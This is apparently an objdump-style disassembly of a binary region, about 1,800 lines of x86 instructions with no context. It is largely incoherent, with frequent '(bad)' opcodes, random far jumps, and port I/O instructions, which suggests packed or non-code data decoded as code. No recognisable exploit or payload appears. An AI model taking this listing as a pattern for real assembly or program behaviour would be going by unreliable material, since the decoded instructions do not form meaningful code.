  4265d0:	add    ch,bl
  4265d2:	sub    eax,0xec0173c
  4265d7:	xor    dl,0xcf
  4265da:	mov    ah,0xbc
  4265dc:	sbb    DWORD PTR [ebp-0x13],ebp
  4265df:	inc    esi
  4265e0:	popa   
  4265e1:	and    al,0xdb
  4265e3:	loop   0x42665a
  4265e5:	fisttp DWORD PTR [ebx]
  4265e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265e8:	mov    ?,WORD PTR es:[ebp-0x554915d7]
  4265ef:	int    0xdd
  4265f1:	pop    eax
  4265f2:	push   cs
  4265f3:	xor    al,0x74
  4265f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265f6:	sbb    dl,al
  4265f8:	(bad)  
  4265f9:	push   ecx
  4265fa:	in     eax,dx
  4265fb:	icebp  
  4265fc:	(bad)  
  4265fe:	cs inc ebp
  426600:	pop    ebx
  426601:	or     ebx,eax
  426603:	adc    edx,ebx
  426605:	add    ebx,edx
  426607:	div    DWORD PTR [esi+0x772c105d]
  42660d:	ins    BYTE PTR es:[edi],dx
  42660e:	je     0x4265a2
  426610:	dec    esi
  426611:	dec    edx
  426612:	jp     0x42667c
  426614:	stos   BYTE PTR es:[edi],al
  426615:	pop    ebx
  426616:	(bad)  ds:0x207a4184
  42661c:	xchg   cl,dl
  42661e:	aam    0xc5
  426620:	mov    dh,0xdd
  426622:	ss dec ebp
  426624:	pop    ss
  426625:	mov    eax,ds:0xb07a78f9
  42662a:	das    
  42662b:	mov    ch,0xbf
  42662d:	push   esp
  42662e:	fcom   DWORD PTR [ecx]
  426630:	pop    ds
  426631:	add    eax,0x9dc53d9c
  426636:	jge    0x426638
  426638:	mov    cl,0x48
  42663a:	pop    ebx
  42663b:	ins    DWORD PTR es:[edi],dx
  42663c:	test   eax,0x5f631628
  426641:	mov    ebx,0xedb6d59a
  426646:	inc    esi
  426647:	test   DWORD PTR [edx+0x6e],edx
  42664a:	and    BYTE PTR ds:0xbf5f5b0,bh
  426650:	rcl    DWORD PTR [esi-0x45],1
  426653:	loop   0x42664b
  426655:	push   0x6a7a70e3
  42665a:	leave  
  42665b:	mov    dh,0xb6
  42665d:	lods   eax,DWORD PTR ds:[esi]
  42665e:	ins    DWORD PTR es:[edi],dx
  42665f:	mov    DWORD PTR ds:[eax+ebp*2+0x7f],esi
  426664:	cmc    
  426665:	jbe    0x426683
  426667:	push   ss
  426668:	push   eax
  426669:	mov    ch,0x2d
  42666b:	(bad)  
  42666d:	and    al,BYTE PTR [esi-0x14]
  426670:	inc    ecx
  426671:	sbb    eax,0xb8aeda45
  426676:	sar    BYTE PTR [edx],1
  426678:	mov    bl,0x7c
  42667a:	mov    cl,ch
  42667c:	fidivr WORD PTR [ebx-0x3e]
  42667f:	xor    dl,BYTE PTR ds:0xbc976d2d
  426685:	pop    edi
  426686:	xor    dl,BYTE PTR [ebx-0x3b]
  426689:	inc    edi
  42668a:	cmp    esp,DWORD PTR [ebp+0x21320d85]
  426690:	jg     0x42663e
  426692:	xchg   esp,eax
  426693:	add    esp,DWORD PTR [ebx]
  426695:	sub    al,0x2c
  426697:	sub    eax,0x773fafdb
  42669c:	test   ecx,0xa0a01cec
  4266a2:	ror    BYTE PTR [edx],1
  4266a4:	and    eax,0x1bb8bfa2
  4266a9:	imul   ebx,ebx,0x76
  4266ac:	mov    ds:0x1d9f8a82,eax
  4266b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266b2:	add    al,0xb6
  4266b4:	jno    0x4266e8
  4266b6:	pop    esp
  4266b7:	ret    0xada5
  4266ba:	jo     0x4266e7
  4266bc:	mov    edx,cs
  4266be:	push   0xe42e95e6
  4266c3:	sbb    al,0xb5
  4266c5:	sbb    eax,0xcb0d85c5
  4266ca:	xchg   edx,eax
  4266cb:	cwde   
  4266cc:	lahf   
  4266cd:	mov    eax,ds:0x86c1141a
  4266d2:	mov    eax,0x124ed9dd
  4266d7:	xor    BYTE PTR [ecx+0x61],0x6b
  4266db:	add    dl,bl
  4266dd:	pop    ecx
  4266de:	mov    edi,0x29905f63
  4266e3:	sbb    al,BYTE PTR [edx+0x696ab44b]
  4266e9:	xchg   ebx,eax
  4266ea:	jge    0x42673b
  4266ec:	dec    esp
  4266ed:	mov    cs,eax
  4266ef:	shr    BYTE PTR [esi+0x14],1
  4266f2:	outs   dx,BYTE PTR ds:[esi]
  4266f3:	imul   esp,DWORD PTR [ecx],0x65
  4266f6:	jg     0x426734
  4266f8:	push   esp
  4266f9:	fild   WORD PTR ds:0xbb5b6db6
  4266ff:	add    al,0x57
  426701:	ror    dh,1
  426703:	lds    esi,FWORD PTR [edx+0x788c5eec]
  426709:	add    ecx,DWORD PTR ds:[eax+0x6541db1b]
  426710:	inc    edx
  426711:	cmovns ecx,ecx
  426714:	fild   DWORD PTR [edi-0x255fa7f3]
  42671a:	iret   
  42671b:	imul   eax,DWORD PTR [edx-0xb],0xffffffe2
  42671f:	aaa    
  426720:	mov    dh,0xad
  426722:	ret    0xec82
  426725:	pop    ebx
  426726:	and    eax,0x906c4499
  42672b:	mov    ch,0xa9
  42672d:	outs   dx,BYTE PTR ds:[esi]
  42672e:	ins    BYTE PTR es:[edi],dx
  42672f:	dec    ebp
  426730:	push   esp
  426731:	pop    edx
  426732:	jne    0x426766
  426734:	push   ds
  426735:	xor    edi,edx
  426737:	push   es
  426738:	inc    ecx
  426739:	pop    ebx
  42673a:	cmp    eax,DWORD PTR [eax]
  42673c:	scas   al,BYTE PTR es:[edi]
  42673d:	fstp   QWORD PTR [eax]
  42673f:	mov    BYTE PTR [edi],bl
  426741:	push   es
  426742:	add    ch,BYTE PTR [esi]
  426744:	xor    al,0x1e
  426746:	sbb    DWORD PTR [ebp+0x714c1043],esi
  42674c:	mov    eax,ds:0xf501b6dd
  426751:	js     0x4267c7
  426753:	enter  0x5c13,0xca
  426757:	cmp    DWORD PTR [eax-0x45],0x3544d1b1
  42675e:	jle    0x4267de
  426760:	mov    bh,0x5a
  426762:	xor    cl,BYTE PTR [ebx]
  426764:	je     0x426707
  426766:	sbb    BYTE PTR [ebx],0x6d
  426769:	clc    
  42676a:	cwde   
  42676b:	pop    ebp
  42676c:	xchg   BYTE PTR [ebx+0x5d],ch
  42676f:	push   0x51
  426771:	lods   eax,DWORD PTR ds:[esi]
  426772:	mov    eax,ds:0xdd554906
  426777:	mov    edx,0x3a8abada
  42677c:	icebp  
  42677d:	inc    eax
  42677e:	dec    edx
  42677f:	scas   al,BYTE PTR es:[edi]
  426780:	mov    edi,0x285fe528
  426785:	fsubr  QWORD PTR [ecx+0x3df1fc83]
  42678b:	cmp    BYTE PTR [ebx+0x7e2400],0x42
  426792:	popa   
  426793:	imul   ebx,esp,0xffffffda
  426796:	push   0x50
  426798:	das    
  426799:	(bad)  
  42679a:	xchg   ebp,eax
  42679b:	(bad)
  42679f:	sbb    al,0x75
  4267a1:	lds    ebp,FWORD PTR [ebp+0x63]
  4267a4:	inc    edi
  4267a5:	data16 clc 
  4267a7:	cmp    edx,ebp
  4267a9:	xchg   ebx,eax
  4267aa:	leave  
  4267ab:	fs call 0xe897:0x5f0be5b6
  4267b3:	add    BYTE PTR [edi],cl
  4267b5:	inc    ebp
  4267b6:	mov    bl,0xa0
  4267b8:	xchg   ebp,eax
  4267b9:	push   esi
  4267ba:	push   ss
  4267bb:	test   al,0x86
  4267bd:	fidiv  DWORD PTR [ebx+0x305eaf1c]
  4267c3:	fidiv  DWORD PTR [esi+0x29952c2c]
  4267c9:	(bad)  
  4267ca:	out    dx,al
  4267cb:	cli    
  4267cc:	shr    BYTE PTR [ecx+eiz*4],cl
  4267cf:	sub    al,0xb4
  4267d1:	or     ebx,ebx
  4267d3:	cld    
  4267d4:	add    eax,0x4dc9311c
  4267d9:	mov    DWORD PTR [ebx],edx
  4267db:	arpl   WORD PTR [eax-0x7b93efd5],sp
  4267e1:	push   eax
  4267e2:	rcl    DWORD PTR [ebp+0x6b44221],1
  4267e8:	xchg   BYTE PTR [ecx-0x27],al
  4267eb:	fwait
  4267ec:	mov    edx,0xb76b6081
  4267f1:	mov    esp,0xc55c4862
  4267f6:	(bad)  
  4267f7:	fstp   QWORD PTR [ebx]
  4267f9:	pop    ebx
  4267fa:	in     eax,dx
  4267fb:	inc    edx
  4267fc:	mov    al,ds:0x3a47673b
  426801:	scas   eax,DWORD PTR es:[edi]
  426802:	aad    0xac
  426804:	shr    BYTE PTR [esi+0x2c],1
  426807:	ins    DWORD PTR es:[edi],dx
  426808:	push   0xffc6cb8b
  42680d:	mov    ds:0xea8265d0,al
  426812:	cmp    BYTE PTR [edx+0x4087043a],0xd4
  426819:	(bad)  
  42681a:	(bad)  [esi-0x35f8dcb0]
  426820:	sti    
  426821:	imul   eax,DWORD PTR [eax+0x15c04492],0xdaa01b6c
  42682b:	add    eax,0x9feae1e
  426830:	jmp    0x359a:0xca1d6e08
  426837:	cli    
  426838:	ins    DWORD PTR es:[edi],dx
  426839:	loop   0x42689c
  42683b:	aam    0x76
  42683d:	fistp  DWORD PTR [eax-0x23]
  426840:	daa    
  426841:	pusha  
  426842:	jge    0x426839
  426844:	fninit 
  426846:	retf   
  426847:	pop    ds
  426848:	sbb    ebx,DWORD PTR [ebx]
  42684a:	pop    ebx
  42684b:	inc    ebx
  42684c:	jne    0x42687e
  42684e:	rcr    DWORD PTR [ecx-0x5e],1
  426851:	pop    edi
  426852:	js     0x426825
  426854:	ins    BYTE PTR es:[edi],dx
  426855:	mov    bh,0xba
  426857:	mov    ds:0x5b2464a6,al
  42685c:	call   0x373bb34f
  426861:	fisubr DWORD PTR [ebp+0x6b]
  426864:	push   edi
  426865:	and    BYTE PTR [edi+0x86f2262],bl
  42686b:	fsubr  st,st(2)
  42686d:	aam    0x6d
  42686f:	imul   esi,DWORD PTR [edi-0x7fb9b3bd],0x77
  426876:	dec    eax
  426877:	sar    DWORD PTR [edi-0x3],1
  42687a:	mov    BYTE PTR [ebx+0x6d],bl
  42687d:	inc    edi
  42687e:	loopne 0x4268c3
  426880:	icebp  
  426881:	mov    al,0x7f
  426883:	retf   
  426884:	cdq    
  426885:	sbb    edx,ebp
  426887:	sub    BYTE PTR [esi],0x96
  42688a:	and    ebx,DWORD PTR [edi+0x768233ba]
  426890:	push   esp
  426891:	sbb    esp,DWORD PTR [eax+0x53]
  426894:	inc    eax
  426895:	dec    DWORD PTR [eax+0x1a0295bb]
  42689b:	out    dx,al
  42689c:	aaa    
  42689d:	in     eax,0x65
  42689f:	sbb    ebp,ebp
  4268a1:	jp     0x4268a7
  4268a3:	ins    DWORD PTR es:[edi],dx
  4268a4:	sbb    ebp,DWORD PTR [ebp-0x44]
  4268a7:	jno    0x4268fd
  4268a9:	pop    ss
  4268aa:	push   ebx
  4268ab:	scas   al,BYTE PTR es:[edi]
  4268ac:	aad    0x11
  4268ae:	jo     0x42691b
  4268b0:	lock xor bl,BYTE PTR [ebp+0x76978684]
  4268b7:	jmp    0x426839
  4268b9:	mov    eax,0xb058905e
  4268be:	mov    al,ds:0x62088d17
  4268c3:	inc    esp
  4268c4:	inc    edi
  4268c5:	shr    BYTE PTR [ebp-0xca3aa1b],1
  4268cb:	inc    ecx
  4268cc:	push   esi
  4268cd:	or     BYTE PTR [esi+0x680edb02],dh
  4268d3:	jecxz  0x426855
  4268d5:	sbb    al,BYTE PTR ss:[ecx]
  4268d8:	fcmovnb st,st(7)
  4268da:	jno    0x4268ab
  4268dc:	ret    0xc9b7
  4268df:	rcl    BYTE PTR [eax],0x74
  4268e2:	fisttp DWORD PTR [ebx]
  4268e4:	pop    ebp
  4268e5:	xor    cl,BYTE PTR [ebx+eax*4]
  4268e8:	pop    esi
  4268e9:	stc    
  4268ea:	lea    ebp,[ebp+0x23]
  4268ed:	sbb    eax,0xbde698bb
  4268f2:	push   eax
  4268f3:	mov    ebp,0xad939e00
  4268f8:	mov    al,ds:0x3a925be5
  4268fd:	call   0xf23b1e02
  426902:	lods   eax,DWORD PTR ds:[esi]
  426903:	inc    ebp
  426904:	adc    eax,0xf3e3266e
  426909:	mov    ch,0xf3
  42690b:	lods   eax,DWORD PTR ds:[esi]
  42690c:	or     ebx,DWORD PTR [ebx+0x53]
  42690f:	ror    DWORD PTR [ebx],1
  426911:	cs or  al,0xbf
  426914:	sub    DWORD PTR [edx],eax
  426916:	loop   0x426989
  426918:	scas   al,BYTE PTR es:[edi]
  426919:	mov    BYTE PTR [ebp+0x27a63a5],al
  42691f:	pop    ds
  426920:	(bad)  
  426921:	bound  ecx,QWORD PTR [ebx+0x4d]
  426924:	add    eax,0x85de6db
  426929:	fmul   QWORD PTR [ebp-0x61]
  42692c:	repnz in al,0x68
  42692f:	imul   ecx,DWORD PTR [edx+0x3854705b],0xffffffbe
  426936:	push   eax
  426937:	inc    ecx
  426938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426939:	fidiv  DWORD PTR [esi-0x3d]
  42693c:	pusha  
  42693d:	ja     0x4268ee
  42693f:	sub    ah,BYTE PTR [ecx+0x7a32e35a]
  426945:	dec    ebp
  426946:	adc    eax,0xc1eb1617
  42694b:	mov    es,WORD PTR [esi]
  42694d:	sub    eax,0x2c6ea8f7
  426952:	ins    DWORD PTR es:[edi],dx
  426953:	sbb    eax,DWORD PTR [ebx]
  426955:	repnz sub DWORD PTR [edx+0x3c72d06b],eax
  42695c:	add    ecx,DWORD PTR [edx+0x5eb7f2db]
  426962:	test   eax,0xc56400
  426967:	lock pop edx
  426969:	jecxz  0x426905
  42696b:	add    DWORD PTR [ebx-0x15],edx
  42696e:	fdivr  DWORD PTR [edx]
  426970:	push   ebx
  426971:	jecxz  0x42691a
  426973:	scas   eax,DWORD PTR es:[edi]
  426974:	pop    ebp
  426975:	push   edx
  426976:	aam    0x95
  426978:	mov    al,0xb4
  42697a:	xor    eax,0xf2d81744
  42697f:	adc    DWORD PTR [eax],0xffffffc2
  426982:	jp     0x4269e5
  426984:	mov    ebx,DWORD PTR [eax-0x42]
  426987:	xchg   ecx,eax
  426988:	std    
  426989:	xor    DWORD PTR [eax],eax
  42698b:	(bad)  
  42698c:	(bad)  
  42698d:	cs jae 0x42691e
  426990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426991:	xchg   al,ch
  426993:	inc    esi
  426994:	xor    eax,DWORD PTR [edx+0x4e]
  426997:	pop    ebx
  426998:	add    al,0x65
  42699a:	cs ins DWORD PTR es:[edi],dx
  42699c:	sub    al,0xb5
  42699e:	xchg   esp,eax
  42699f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269a0:	(bad)  
  4269a2:	and    al,0x91
  4269a4:	clc    
  4269a5:	outs   dx,DWORD PTR ds:[esi]
  4269a6:	xchg   esp,eax
  4269a7:	adc    DWORD PTR [ebx],ecx
  4269a9:	cmp    ecx,DWORD PTR [eax-0x53d360dd]
  4269af:	push   esi
  4269b0:	(bad)  [eax+0x41]
  4269b3:	pop    es
  4269b4:	jg     0x4269ba
  4269b6:	(bad)  
  4269b7:	inc    ebp
  4269b8:	scas   al,BYTE PTR es:[edi]
  4269b9:	inc    ecx
  4269ba:	stos   BYTE PTR es:[edi],al
  4269bb:	ins    DWORD PTR es:[edi],dx
  4269bc:	add    eax,DWORD PTR [ecx]
  4269be:	rcr    DWORD PTR [esi+ebp*8],1
  4269c1:	fwait
  4269c2:	xor    DWORD PTR [eax+0x206da85d],esi
  4269c8:	cmp    al,BYTE PTR [edi]
  4269ca:	sbb    al,BYTE PTR [eax+0x3c02919b]
  4269d0:	pop    ebx
  4269d1:	test   eax,0x1288b4a0
  4269d6:	jecxz  0x426994
  4269d8:	dec    BYTE PTR [esi]
  4269da:	add    al,0x2d
  4269dc:	mov    ch,0xb
  4269de:	pop    esi
  4269df:	es cwde 
  4269e1:	imul   ecx,DWORD PTR [ebp-0xc],0xffffffb5
  4269e5:	dec    ebp
  4269e6:	add    DWORD PTR [esi+edi*4],ebp
  4269e9:	lds    edi,FWORD PTR [ebx+0x50]
  4269ec:	(bad)  [eax+eiz*4+0x23b8d858]
  4269f3:	loopne 0x4269d7
  4269f5:	push   ds
  4269f6:	xchg   esi,eax
  4269f7:	mov    eax,0x6b696d31
  4269fc:	sbb    esi,ebx
  4269fe:	mov    al,ds:0x834d1459
  426a03:	(bad)
  426a07:	mov    bl,BYTE PTR [ebp-0x40]
  426a0a:	and    ebx,esi
  426a0c:	mov    ds:0x69b4b490,al
  426a11:	mov    edx,esi
  426a13:	test   edx,ebp
  426a15:	dec    esp
  426a16:	mov    ch,0x77
  426a18:	sbb    ebx,esi
  426a1a:	les    esi,FWORD PTR [edx]
  426a1c:	in     eax,0x6a
  426a1e:	mov    ds:0xe0feec74,eax
  426a23:	cld    
  426a24:	push   ss
  426a25:	inc    edi
  426a26:	mov    bl,BYTE PTR [ebx-0x45]
  426a29:	mov    al,0x9a
  426a2b:	pop    ecx
  426a2c:	add    BYTE PTR [ebx],0x85
  426a2f:	push   ebx
  426a30:	pop    ecx
  426a31:	jp     0x426aad
  426a33:	popa   
  426a34:	(bad)  [esi-0x67]
  426a37:	fsub   QWORD PTR fs:[ebp+ebx*8+0x4a]
  426a3c:	out    dx,eax
  426a3d:	adc    al,0xfb
  426a3f:	fldenv [ecx-0x32bfb5ea]
  426a45:	cs mov esp,0x2bb0041c
  426a4b:	pusha  
  426a4c:	aas    
  426a4d:	xor    ecx,DWORD PTR [ecx+eax*8-0x46]
  426a51:	mov    bl,al
  426a53:	or     esp,DWORD PTR ss:[ebp+ebp*4-0x26]
  426a58:	xor    eax,0x7690b3d
  426a5d:	adc    BYTE PTR [edi],dl
  426a5f:	inc    ebx
  426a60:	das    
  426a61:	push   ds
  426a62:	iret   
  426a63:	test   ebx,0xc6c6d0bc
  426a69:	inc    edx
  426a6a:	lods   al,BYTE PTR ds:[esi]
  426a6b:	ins    BYTE PTR es:[edi],dx
  426a6c:	lahf   
  426a6d:	xor    BYTE PTR [esi],0x34
  426a70:	mov    al,ds:0xadcddb6d
  426a75:	cmp    ecx,DWORD PTR [ecx-0x36]
  426a78:	push   cs
  426a79:	inc    ebp
  426a7a:	retf   
  426a7b:	fist   WORD PTR [ebp-0x5ebd2d2b]
  426a81:	popa   
  426a82:	ins    DWORD PTR es:[edi],dx
  426a83:	call   0x41a04771
  426a88:	fist   DWORD PTR [esi]
  426a8a:	stos   BYTE PTR es:[edi],al
  426a8b:	outs   dx,BYTE PTR ds:[esi]
  426a8c:	clc    
  426a8d:	xlat   BYTE PTR ds:[ebx]
  426a8e:	dec    ecx
  426a8f:	imul   eax,DWORD PTR ds:0xd05b856d,0x36
  426a96:	add    DWORD PTR es:[edi],ebp
  426a99:	sbb    cl,BYTE PTR ds:0xeadb741
  426a9f:	stos   BYTE PTR es:[edi],al
  426aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426aa1:	add    eax,0xbe3d1282
  426aa6:	ins    BYTE PTR es:[edi],dx
  426aa7:	mov    eax,gs:0x3857945b
  426aad:	add    BYTE PTR [edx+0x56],0x6a
  426ab1:	and    esp,edx
  426ab3:	(bad)  
  426ab4:	cs mov esi,0x6bef5685
  426aba:	(bad)
  426abe:	(bad)  
  426abf:	ins    DWORD PTR es:[edi],dx
  426ac0:	mov    ds:0xbfff5151,eax
  426ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ac6:	sub    edx,DWORD PTR [ebx+ecx*1-0x78]
  426aca:	fist   DWORD PTR [esi-0x3f]
  426acd:	sbb    bh,cl
  426acf:	push   esi
  426ad0:	(bad)  
  426ad1:	(bad)  
  426ad2:	retf   0xc44d
  426ad5:	jbe    0x426a78
  426ad7:	ret    
  426ad8:	call   0x4304f5d7
  426add:	repnz mov dh,0xb
  426ae0:	sub    al,0x6c
  426ae2:	or     edi,DWORD PTR [edx]
  426ae4:	int    0x86
  426ae6:	int    0x19
  426ae8:	sub    al,0x9
  426aea:	adc    bl,bl
  426aec:	lods   eax,DWORD PTR ds:[esi]
  426aed:	or     DWORD PTR [eax-0x5bd68e70],ecx
  426af3:	bound  ecx,QWORD PTR [edx]
  426af5:	jmp    0x5bb7b8b1
  426afa:	push   0xe9d0facb
  426aff:	in     eax,0xc0
  426b01:	pop    ecx
  426b02:	xor    BYTE PTR [eax+0x6caa1ab9],bh
  426b08:	sbb    bh,BYTE PTR [edi+0x5a48986a]
  426b0e:	push   0x37
  426b10:	call   0x94ea:0xcfdfea20
  426b17:	fwait
  426b18:	mov    al,0xd0
  426b1a:	inc    ecx
  426b1b:	(bad)  [edx+0x56]
  426b1e:	push   eax
  426b1f:	out    0x6a,al
  426b21:	retf   0xa953
  426b24:	jmp    0xb8e5:0x7f3db888
  426b2b:	jne    0x426ade
  426b2d:	cs ins BYTE PTR es:[edi],dx
  426b2f:	mov    ah,0x6d
  426b31:	cli    
  426b32:	push   ebx
  426b33:	and    al,0xda
  426b35:	or     DWORD PTR [ecx+0x58],edi
  426b38:	repnz arpl bx,bx
  426b3b:	push   0xffffffbb
  426b3d:	or     BYTE PTR [ebp-0x33],cl
  426b40:	mov    eax,0x267fd98
  426b45:	pop    ebp
  426b46:	bound  eax,QWORD PTR [ebx+0x426b586d]
  426b4c:	xlat   BYTE PTR ds:[ebx]
  426b4d:	icebp  
  426b4e:	dec    edi
  426b4f:	or     edi,esp
  426b51:	adc    al,0xad
  426b53:	or     eax,0x2134b3b1
  426b58:	sar    BYTE PTR [ecx-0x27],1
  426b5b:	pop    eax
  426b5c:	sub    ch,bl
  426b5e:	push   0xffffffd4
  426b60:	xchg   edi,eax
  426b61:	iret   
  426b62:	inc    ebx
  426b63:	cwde   
  426b64:	out    dx,al
  426b65:	mov    bl,0xd
  426b67:	xor    al,0xb6
  426b69:	mov    al,BYTE PTR [eax+0x23]
  426b6c:	jmp    0x6db4:0x5d1bc4f9
  426b73:	or     BYTE PTR [ebp+edx*4-0x4b],bl
  426b77:	out    dx,eax
  426b78:	xchg   esp,eax
  426b79:	mov    cl,BYTE PTR [eax+0x1b80aeb6]
  426b7f:	mov    ds:0x2eae41c7,al
  426b84:	sti    
  426b85:	jbe    0x426b38
  426b87:	adc    eax,0x2265a236
  426b8c:	call   0xba22:0x6a5c05cb
  426b93:	scas   al,BYTE PTR es:[edi]
  426b94:	enter  0xdf98,0xc0
  426b98:	jecxz  0x426b1e
  426b9a:	shr    BYTE PTR ds:0x40157514,cl
  426ba0:	cmp    ah,BYTE PTR [eax]
  426ba2:	pop    eax
  426ba4:	test   edx,edx
  426ba6:	lods   eax,DWORD PTR ds:[esi]
  426ba7:	sub    eax,esp
  426ba9:	push   esi
  426baa:	push   edi
  426bab:	cmc    
  426bac:	in     eax,0xc6
  426bae:	pop    esp
  426baf:	lods   eax,DWORD PTR ds:[esi]
  426bb0:	or     esp,DWORD PTR [eax+0x47]
  426bb3:	mov    eax,ds:0x81fdf57a
  426bb8:	push   ebx
  426bb9:	sbb    eax,0xe1ffc411
  426bbf:	push   esi
  426bc0:	jg     0x426b60
  426bc2:	push   0xffffffb0
  426bc4:	rol    BYTE PTR [ecx],1
  426bc6:	mov    ch,0xa8
  426bc8:	popf   
  426bc9:	add    BYTE PTR [ebx-0x2a],bl
  426bcc:	xchg   edx,eax
  426bcd:	push   ecx
  426bce:	pop    ebp
  426bcf:	sub    dl,BYTE PTR [eax]
  426bd1:	test   eax,0xb05b08f
  426bd6:	(bad)  [esi-0x6d7dcccb]
  426bdc:	ret    
  426bdd:	sbb    eax,0x10675654
  426be2:	lock sub ch,0xd6
  426be6:	mov    dh,0xf3
  426be8:	mov    bl,0xac
  426bea:	(bad)  
  426beb:	sti    
  426bec:	mov    dh,0xc1
  426bee:	adc    DWORD PTR [esi],esi
  426bf0:	outs   dx,BYTE PTR ds:[esi]
  426bf1:	lea    ebp,[eax+0x3ca541a3]
  426bf7:	enter  0x46cf,0x5
  426bfb:	cmp    esp,DWORD PTR [eax-0x25]
  426bfe:	dec    ebp
  426bff:	gs (bad) 
  426c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c02:	mov    edx,0x29aaed05
  426c07:	bound  edx,QWORD PTR [edi]
  426c09:	arpl   si,dx
  426c0b:	mov    eax,DWORD PTR [eax]
  426c0d:	push   ss
  426c0e:	fcmovnb st,st(2)
  426c10:	inc    esi
  426c11:	test   eax,0xa31b51bf
  426c16:	cld    
  426c17:	push   ebx
  426c18:	cmp    DWORD PTR [ecx-0x57],esp
  426c1b:	sub    eax,0x1164f900
  426c20:	push   cs
  426c21:	not    BYTE PTR [edx+0x4b]
  426c24:	sbb    eax,0xd38774b1
  426c29:	dec    edx
  426c2a:	pop    edx
  426c2b:	inc    esp
  426c2c:	push   0x209bdf8f
  426c31:	cs mov ch,0x7e
  426c34:	push   eax
  426c35:	es jae 0x426c1f
  426c38:	(bad)  
  426c39:	(bad)  
  426c3a:	aam    0x46
  426c3c:	mov    ch,0xd0
  426c3e:	inc    ebp
  426c3f:	sbb    BYTE PTR es:[edx],cl
  426c42:	inc    eax
  426c43:	jns    0x426ca2
  426c45:	inc    ebp
  426c46:	fdiv   QWORD PTR [esi+0x79867071]
  426c4c:	xor    DWORD PTR [ecx],0x6a
  426c4f:	les    eax,FWORD PTR [esi+0x26e4b620]
  426c55:	ret    0x4a69
  426c58:	and    DWORD PTR [edi],edx
  426c5a:	or     dl,cl
  426c5c:	push   ecx
  426c5d:	addps  xmm7,XMMWORD PTR [ebx+0x43]
  426c61:	shl    ebx,0xb5
  426c64:	ins    DWORD PTR es:[edi],dx
  426c65:	adc    edx,DWORD PTR ds:0x86ea893e
  426c6b:	cs pop ecx
  426c6d:	mov    BYTE PTR [eax-0x3b314f4c],bh
  426c73:	fmul   QWORD PTR [eax+0x62]
  426c76:	sbb    eax,0xa0b6089b
  426c7b:	ins    DWORD PTR es:[edi],dx
  426c7c:	fwait
  426c7d:	inc    esi
  426c7e:	jnp    0x426cf1
  426c80:	mov    eax,0xc004d577
  426c85:	cs pop edi
  426c87:	jmp    0x6d706da2
  426c8c:	inc    ebx
  426c8d:	aad    0x16
  426c8f:	(bad)  
  426c90:	fidiv  DWORD PTR [edi]
  426c92:	idiv   BYTE PTR [edi-0x17]
  426c95:	dec    esi
  426c96:	adc    al,0x6c
  426c98:	test   al,0xcb
  426c9a:	sbb    al,0xf9
  426c9c:	xor    eax,0xb6176ae2
  426ca1:	push   ss
  426ca2:	lods   al,BYTE PTR ds:[esi]
  426ca3:	or     eax,0x38e8ebbe
  426ca8:	push   ebp
  426ca9:	pop    esp
  426caa:	fild   DWORD PTR [esi]
  426cac:	and    eax,0x9901d6d8
  426cb1:	or     BYTE PTR [edx+0x26c171c5],ch
  426cb7:	mov    ds:0xc8920ea5,al
  426cbc:	jns    0x426d32
  426cbe:	mov    al,ds:0x4db6d6e
  426cc3:	lahf   
  426cc4:	cmc    
  426cc5:	adc    al,0x74
  426cc7:	jmp    DWORD PTR [edi+0x362fec7a]
  426ccd:	fdivr  DWORD PTR [edx+0x6b7f4900]
  426cd3:	data16 fst QWORD PTR [esi+eax*2]
  426cd7:	pop    ecx
  426cd8:	pop    edx
  426cd9:	stos   BYTE PTR es:[edi],al
  426cda:	lods   eax,DWORD PTR ss:[esi]
  426cdc:	and    bh,dl
  426cde:	add    edx,DWORD PTR [ebx+ebx*1]
  426ce1:	add    ebx,ebx
  426ce3:	outs   dx,DWORD PTR ds:[esi]
  426ce4:	aam    0x2c
  426ce6:	mov    dh,0x2c
  426ce8:	add    BYTE PTR [esi+0x45],0x43
  426cec:	push   esi
  426ced:	fisub  WORD PTR [edi-0x6a4f4e4a]
  426cf3:	mov    bh,0xa4
  426cf5:	sbb    BYTE PTR ds:0x47b0a561,bh
  426cfb:	sub    BYTE PTR [eax-0x13],dl
  426cfe:	(bad)  
  426cff:	push   esi
  426d00:	adc    ah,cl
  426d02:	mov    ebx,0x342d6356
  426d07:	call   0x7e97:0x58a8e4d8
  426d0e:	sbb    DWORD PTR [edi],esi
  426d10:	stos   BYTE PTR es:[edi],al
  426d11:	mov    ah,0x6d
  426d13:	push   esp
  426d14:	jle    0x426d57
  426d16:	sbb    cl,ch
  426d18:	jp     0x426d6f
  426d1a:	xor    al,0xb6
  426d1c:	lods   eax,DWORD PTR ds:[esi]
  426d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d1e:	int3   
  426d1f:	sahf   
  426d20:	mov    cl,0xe1
  426d22:	add    eax,0x3fb68da0
  426d27:	repnz clc 
  426d29:	cdq    
  426d2a:	das    
  426d2b:	or     BYTE PTR ds:[edx],bh
  426d2e:	mov    al,ds:0xe096ce4b
  426d33:	push   ebp
  426d34:	cmp    eax,0xb42c50a2
  426d39:	xchg   ebp,eax
  426d3a:	and    dl,bl
  426d3c:	and    al,0x5a
  426d3e:	push   0xffffffaa
  426d40:	lods   eax,DWORD PTR ss:[esi]
  426d42:	xchg   ebp,eax
  426d43:	pop    ebp
  426d44:	mov    ch,0x32
  426d46:	or     DWORD PTR [esi],esp
  426d48:	sub    dh,BYTE PTR [esi+0x531923a5]
  426d4e:	stc    
  426d4f:	xchg   ebp,eax
  426d50:	outs   dx,BYTE PTR ds:[esi]
  426d51:	dec    ebp
  426d52:	shl    BYTE PTR [ebp+0x7f88ef57],1
  426d58:	sbb    edi,DWORD PTR [edi-0x14]
  426d5b:	int3   
  426d5c:	mov    eax,ds:0xa3ad8a50
  426d61:	in     eax,dx
  426d62:	repnz repnz lds esi,FWORD PTR [ebx+0x5b]
  426d67:	or     eax,0x27234280
  426d6c:	pop    eax
  426d6d:	fidivr DWORD PTR [eax-0x2cf49250]
  426d73:	inc    edx
  426d74:	sub    ebp,esp
